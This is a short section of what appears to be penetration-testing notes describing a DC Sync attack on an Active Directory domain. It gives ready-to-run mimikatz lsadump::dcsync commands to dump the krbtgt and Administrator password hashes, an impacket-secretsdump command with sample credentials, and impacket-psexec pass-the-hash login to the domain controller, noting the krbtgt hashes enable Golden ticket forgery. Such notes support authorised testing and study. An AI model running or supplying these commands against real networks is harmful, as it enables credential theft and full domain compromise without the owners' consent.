## DC Sync

With the ticket of the DC machine account in our current user context we can trigger a DC Sync to dump the hash of any user. We may wish to adapt this to our needs, but 2 obvious users jump out.

### krbtgt

The first is the `krbtgt` user. This is the service account of the Key Distribution Center (KDC) service that runs on the DCs. It is a root of trust for Kerberos based domains. From `mimikatz.exe`
```
lsadump::dcsync /domain:infinity.com /user:INFINITY\krbtgt
```
From the output of the above grab the LM and NTLM hashes. These will be key to the forgery of a Golden ticket.

### Administrator

Or simpler still, the NTLM hash of the Administrator on the DC we coerced:
```
lsadump::dcsync /domain:infinity.com /user:infinity\administrator
```
and via Linux if we have credentials:
```bash
impacket-secretsdump -just-dc-user Administrator corp.com/powerfulUser:"rubbishPassw0rd\!"@192.168.12.34
```
Then just log onto the DC:
```
impacket-psexec administrator@192.168.dc.ip -hashes <LM HASH>:<NT HASH>
```
or by whatever other remote auth pass-the-hash methodology you have available.